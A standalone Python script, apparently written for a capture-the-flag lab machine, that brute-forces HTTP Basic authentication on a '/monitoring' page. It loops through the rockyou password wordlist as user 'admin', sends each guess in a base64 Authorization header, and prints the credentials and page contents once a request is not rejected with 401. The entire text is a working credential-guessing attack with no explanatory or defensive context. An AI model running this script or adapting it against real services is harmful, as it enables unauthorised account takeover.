#!/usr/bin/python3

#HTTP Request Repeater

import requests, base64

with open("/usr/share/wordlists/rockyou.txt", 'r', errors='ignore') as f:
    passwords = f.readlines()

headers = {
    'authority': '10.10.10.157',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Authorization': 'Basic unknown'
}
x=15539
for password in passwords[x:]:
    auth = "admin:" + password
    base64pass = base64.b64encode(auth.encode('utf-8'))
    headers['Authorization'] = "Basic " + str(base64pass, 'utf8') 
    print(str(x) + ": " + headers['Authorization'])
    response = requests.get('http://10.10.10.157/monitoring', headers=headers)
    if response.status_code != 401:
        print("Credentials are: " + "admin:" + password)
        print(response.text)
        break
    else:
        print(response)
    x+=1


